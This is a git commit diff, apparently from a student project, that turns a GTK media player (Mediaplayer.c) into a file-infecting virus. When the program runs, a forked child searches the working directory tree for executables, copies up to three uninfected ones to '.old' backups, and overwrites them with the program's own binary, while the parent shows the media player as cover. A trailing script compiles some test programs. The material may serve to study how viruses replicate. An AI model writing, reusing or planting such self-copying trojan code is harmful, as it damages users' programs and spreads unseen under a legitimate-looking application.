10311a2ede12c9a93bc3b9efed6e91e665eafffd
Brenckle Gaetan <gaetan.brenckle@outlook.fr>
2021-03-19 17:32:18 +0100

    [Project] project done.

--- Mediaplayer.c
+++ Mediaplayer.c
@@ -1,12 +1,36 @@
+#include <stdio.h>
+#include <stdlib.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <string.h>
+#include <stdbool.h>
 #include <fcntl.h>
+#include <errno.h>
 #include <gtk/gtk.h>
+
+#define strlens(s) (s == NULL ? 0: strlen(s))
+#define NB_TARGET_MAX 3
 
 static char *MEDIAPLAYER = "./MediaPlayer.exe";
 static char **imgs = NULL;
 static int imgsSize = 0;
 static int pos = -1;
+
+typedef struct Element Element;
+struct Element
+{
+    Element *next;
+    Element *prev;
+    char path[1];
+};
+
+typedef struct List List;
+struct List
+{
+    Element *p;
+};
 
 
 void act_BtnNext(GtkWidget *button, GtkImage *image) {
@@ -56,8 +80,189 @@ int launchMediaPlayer(int argc, char **argv) {
     return 0;
 }
 
-void signalHandler(int _) {
-    fprintf(stdout, "\e[91m%s\e[39m\n", "catch signal");
+void signalHandler(int sig) {
+    fprintf(stdout, "\e[91m%s [%d]\e[39m\n", "catch signal", sig);
+}
+
+List *init(char *file)
+{
+    List *list = malloc(sizeof(List));
+    Element *newElem = malloc(sizeof(Element) + (strlen(file) + 1));
+    if (!list || !newElem) {
+        exit(EXIT_FAILURE);
+    }
+    strcpy(newElem->path, file);
+    newElem->next = NULL;
+    newElem->prev = NULL;
+    list->p = newElem;
+    return list;
+}
+
+List* insert(List **list, char* file)
+{
+    if (!*list){
+        *list = init(file);
+        return *list;
+    }else{
+        Element *newElem = malloc(sizeof(Element) + (strlen(file) + 1));
+        if (!(*list) || !newElem) {
+            exit(EXIT_FAILURE);
+        }
+        strcpy(newElem->path, file);
+
+        newElem->prev = (*list)->p;
+        newElem->next = NULL;
+        if (*list && (*list)->p) {
+            (*list)->p->next = newElem;
+        }
+        (*list)->p = newElem;
+    }
+    return *list;
+}
+
+bool    deleteItem(List **list, Element *deleteItem) {
+    if (!*list && !deleteItem)
+        return false;
+
+    if (deleteItem->next) {
+        deleteItem->next->prev = deleteItem->prev;
+    }
+    if (deleteItem->prev) {
+        deleteItem->prev->next = deleteItem->next;
+    }
+
+    if ((*list)->p == deleteItem) {
+        if (deleteItem->next) {
+            (*list)->p = deleteItem->next;
+        } else if (deleteItem->prev) {
+            (*list)->p = deleteItem->prev;
+        } else {
+            (*list)->p = NULL;
+        }
+    }
+
+    deleteItem->next = NULL;
+    deleteItem->prev = NULL;
+    free(deleteItem);
+    return true;
+}
+
+bool isInfected(char* file, List *liste)
+{
+    if (!liste) {
+        return false;
+    }
+    char cible[500];
+    char *sufOld = ".old";
+    sprintf(cible,"%s%s",file, sufOld);
+    Element *actuel = liste->p;
+    while (actuel != NULL) {
+        if (strcmp(cible, actuel->path) == 0) {
+            return true;
+        }
+        actuel = actuel->prev;
+    }
+    return false;
+}
+
+
+void    reasearch(List **fichiers, List **old, List** dirs) {
+    DIR     *dirp;
+    int     cmp;
+    struct  dirent *entry;
+    struct  stat s;
+    char    *currentfolder;
+    char    fichier[500];
+
+    if (*dirs && (*dirs)->p) {
+        currentfolder = (*dirs)->p->path;
+        dirp = opendir(currentfolder);
+
+        while ((entry = readdir(dirp)) != NULL) {
+            sprintf(fichier, "%s/%s", currentfolder, entry->d_name);
+
+            if (stat(fichier, &s) != -1) {
+                if (S_ISDIR(s.st_mode)
+                && !(strlens(strstr(entry->d_name, ".")) == 1)
+                && !(strlens(strstr(entry->d_name, "..")) == 2)) {
+                    insert(dirs, fichier);
+
+                } else if ((s.st_mode & S_IXUSR) && (s.st_mode & S_IFREG)){
+                    if (strlens(strstr(entry->d_name,".old")) == 4) {
+                        insert(old, fichier);
+                    } else {
+                        insert(fichiers, fichier);
+                    }
+                }
+            }
+        }
+        closedir(dirp);
+    }
+}
+
+List    *searchFileToInfect(char *initPath) {
+    List    *targets = NULL;
+    List    *dirs = NULL;
+    List    *files = NULL;
+    List    *olds = NULL;
+
+    Element *currentDir = NULL;
+    int     nbTarget;
+
+    nbTarget = 0;
+    dirs = insert(&dirs, initPath);
+    while ((currentDir = dirs->p) && nbTarget < NB_TARGET_MAX) {
+        reasearch(&files, &olds, &dirs);
+        deleteItem(&dirs, currentDir);
+
+        if (files) {
+            Element *actualFile = NULL;
+
+            while ((actualFile = files->p)) {
+                if (!isInfected(actualFile->path, olds) && nbTarget < NB_TARGET_MAX) {
+                    insert(&targets, actualFile->path);
+                    nbTarget += 1;
+                }
+                //Moyen de ne pas delete et de juste skip si on veux permettre de chercher
+                //un .old qui serait potentiellement plus haut que le fichier actuel
+                deleteItem(&files, actualFile);
+            }
+        }
+
+        //Delete les .old trouvé avant de partir sur un autre dossier
+        if (olds) {
+            Element *actualOld = NULL;
+            while ((actualOld = olds->p)) {
+                deleteItem(&olds, actualOld);
+            }
+        }
+    }
+
+    if (dirs) {
+        Element *actualDir = NULL;
+        while ((actualDir = dirs->p)) {
+            deleteItem(&dirs, actualDir);
+        }
+        free(dirs);
+    }
+
+    if (files) {
+        Element *actualFile = NULL;
+        while ((actualFile = files->p)) {
+            deleteItem(&files, actualFile);
+        }
+        free(files);
+    }
+
+    if (olds) {
+        Element *actualOld = NULL;
+        while ((actualOld = olds->p)) {
+            deleteItem(&olds, actualOld);
+        }
+        free(olds);
+    }
+
+    return targets;
 }
 
 void catchSignals() {
@@ -67,54 +272,82 @@ void catchSignals() {
     signal(SIGSEGV, signalHandler);
 }
 
-void    duplicate(char *src, char *dest) {
+void    duplicate(char *srcVirus, char *destToInfect) {
     char    buffer[4096];
-    int     fd_src;
-    int     fd_dest;
+    int     fd_srcVirus;
+    int     fd_destToInfect;
+    int     fd_destToInfectOld;
+    char    *destToInfectOld;
     int     bytes;
 
-    fd_src = open(src, O_RDONLY);
-    fd_dest = open(strcat(dest, ".old"), O_WRONLY | O_CREAT, 0755);
+    destToInfectOld = strcat(strdup(destToInfect), ".old");
 
-    while ((bytes = read(fd_src, buffer, 4096)) > 0) {
+    fd_destToInfect = open(destToInfect, O_RDWR);
+    fd_destToInfectOld = open(destToInfectOld, O_WRONLY | O_CREAT, 0755);
+    while ((bytes = read(fd_destToInfect, buffer, 4096)) > 0) {
         if (bytes == -1) {
-            fprintf(stdout, "\e[91m%s\e[39m\n", "Error reading file.");
+            fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Error reading file.", strerror(errno));
             break;
         }
-        if (write(fd_dest, buffer, bytes) == -1) {
-            fprintf(stdout, "\e[91m%s\e[39m\n", "Error writing to file.");
+        if (write(fd_destToInfectOld, buffer, bytes) == -1) {
+            fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Error writing to file.", strerror(errno));
             break;
         }
     }
+    close(fd_destToInfect);
+    close(fd_destToInfectOld);
 
-    close(fd_src);
-    close(fd_dest);
+    fd_srcVirus = open(srcVirus, O_RDONLY);
+    fd_destToInfect = open(destToInfect, O_WRONLY);
+    while ((bytes = read(fd_srcVirus, buffer, 4096)) > 0) {
+        if (bytes == -1) {
+            fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Error reading file.", strerror(errno));
+            break;
+        }
+        if (write(fd_destToInfect, buffer, bytes) == -1) {
+            fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Error writing to file.", strerror(errno));
+            break;
+        }
+    }
+    close(fd_srcVirus);
+    close(fd_destToInfect);
 }
 
-int launchVirus() {
-    catchSignals();
-    fprintf(stdout, "\e[91m%s\e[39m\n", "DUPLICATE");
+int launchVirus(char *str) {
+    char PATH[_SC_UCHAR_MAX];
 
-    char destFile[100] = "Exe1";
-    duplicate("MediaPlayer.exe", destFile);
+    //catchSignals();
 
-    kill(getpid(), SIGSEGV); //TODO testing catch signal
+    fprintf(stderr, "\e[91m%s\e[39m\n", "DUPLICATE");
+    if(getcwd(PATH, _SC_UCHAR_MAX) == NULL) {
+        return EXIT_FAILURE;
+    }
+
+    List* cibles = NULL;
+    cibles = searchFileToInfect(PATH);
+
+    Element *actualtarget = NULL;
+    while ((actualtarget = cibles->p)) {
+        duplicate(str, actualtarget->path);
+        deleteItem(&cibles, actualtarget);
+    }
+    free(cibles);
     return 0;
 }
 
 int main(int argc, char **argv) {
     pid_t   pid;
 
-    printf("launch\n");
+    fprintf(stderr, "\e[91m%s\e[39m\n", "LAUNCH");
 
     if ((pid = fork()) == -1) {
-        printf("fork failed");
+        fprintf(stderr, "\e[91m%s\e[39m\n", "fork failed");
     } else if (pid == 0) { //Nouveau prog
-        fprintf(stdout, "\e[91mpid = %d, ppid = %d\e[39m\n", getpid(), getppid());
-        launchVirus();
+        fprintf(stderr, "\e[91mpid = %d, ppid = %d\e[39m\n", getpid(), getppid());
+        launchVirus(argv[0]);
 
     } else { //Main prog
-        fprintf(stdout, "\e[91mpid = %d, ppid = %d\e[39m\n", getpid(), getppid());
+        fprintf(stderr, "\e[91mpid = %d, ppid = %d\e[39m\n", getpid(), getppid());
 
         if (strcmp(argv[0], MEDIAPLAYER) == 0) {
             launchMediaPlayer(argc - 1, argv + 1);
---
+++ dir/gcc.sh
@@ -0,0 +1,5 @@
+gcc MonPG1.c -o MonPG1 -lm
+gcc MonPG2.c -o MonPG2 -lpthread -lm
+gcc MonPG3.c -o MonPG3
+gcc MonPG4.c -o MonPG4
+gcc MonPG5.c -o MonPG5
